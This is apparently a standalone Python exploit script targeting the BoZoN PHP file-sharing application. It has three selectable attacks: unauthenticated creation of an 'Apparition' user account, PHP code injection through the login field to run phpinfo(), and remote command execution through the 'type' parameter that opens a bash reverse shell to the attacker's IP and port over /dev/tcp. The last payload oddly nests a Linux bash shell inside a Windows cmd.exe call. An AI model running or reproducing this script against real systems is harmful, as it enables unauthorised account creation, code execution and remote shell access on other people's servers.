#!/usr/bin/env python3

import requests
import time
import argparse

def create_user(args):
    url = f'http://{args.IP}/BoZoN-master/index.php'
    data = {
        'creation': '1',
        'login': 'Apparition',
        'pass': 'abc123',
        'confirm': 'abc123',
        'token': ''
    }

    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        print('Apparition user account created! Password: abc123')
    except requests.HTTPError as err:
        print(f"HTTP error occurred: {err}")


def execute_phpinfo(args):
    url = f'http://{args.IP}/BoZoN-master/index.php'
    data = {
        'creation': '1',
        'login': '"];$PWN=''phpinfo();//''//"',
        'pass': 'abc123',
        'confirm': 'abc123',
        'token': ''
    }

    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        print("Done!... waiting for phpinfo")
        time.sleep(0.5)
        print(response.text)
    except requests.HTTPError as err:
        print(f"HTTP error occurred: {err}")


def execute_remote_command(args):
    cmd = f'/bin/bash -c \'/bin/bash -i > /dev/tcp/{args.your_ip}/{args.your_port} 0>&1\''
    port = args.port

    url = f"http://{args.IP}:{port}/BoZoN-master/?type='"
    url += f';echo exec("c:\\Windows\\system32\\cmd.exe /c {cmd} >test.txt");'
    url += "'';';"
    try:
        response = requests.get(url)
        response.raise_for_status()
        url = f"http://{args.IP}:{port}/BoZoN-master/test.txt"
        response = requests.get(url)
        print(response.text)
    except requests.HTTPError as err:
        print(f"HTTP error occurred: {err}")


def main():
    parser = argparse.ArgumentParser(description='Exploit options')
    parser.add_argument('IP', type=str, help='IP Address of the target system')
    parser.add_argument('port', type=str, help='Port number of the target system')
    parser.add_argument('your_ip', type=str, help='Your IP address for reverse shell')
    parser.add_argument('your_port', type=str, help='Your port number for reverse shell')
    parser.add_argument('exploit_selection', type=str, help='[1] Add User \'Apparition\', [2] Execute phpinfo(), [3] Remote Command Execution')
    args = parser.parse_args()

    exploit_options = {
        '1': create_user,
        '2': execute_phpinfo,
        '3': execute_remote_command
    }

    try:
        exploit = exploit_options[args.exploit_selection]
        exploit(args)
    except KeyError:
        print("Invalid option selected!")


if __name__ == "__main__":
    main()
